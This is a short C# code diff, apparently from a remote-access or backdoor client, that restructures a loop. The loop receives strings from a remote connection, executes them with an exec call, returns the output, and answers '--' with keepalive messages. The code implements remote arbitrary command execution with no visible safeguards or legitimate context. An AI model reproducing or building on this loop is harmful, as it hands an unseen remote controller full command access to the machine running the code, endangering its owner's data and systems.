@@ -74,14 +74,16 @@ namespace cevsn
                                         IsConnected = tevsn.IsConnected();
                                         first = true;
                                         Thread.Sleep(1000);
-                                    }
-                                    string recv = tevsn.Receive();
-                                    Console.Write(recv);
-                                    if(recv != "--")
-                                    {
-                                        tevsn.Send(tevsn.exec(recv));
                                     } else {
-                                        tevsn.Send("keepalive");
+                                        Console.Write("Waiting");
+                                        string recv = tevsn.Receive();
+                                        Console.Write(recv);
+                                        if(recv != "--")
+                                        {
+                                            tevsn.Send(tevsn.exec(recv));
+                                        } else {
+                                            tevsn.Send("keepalive");
+                                        }
                                     }
                                     Thread.Sleep(1000);
                                 }
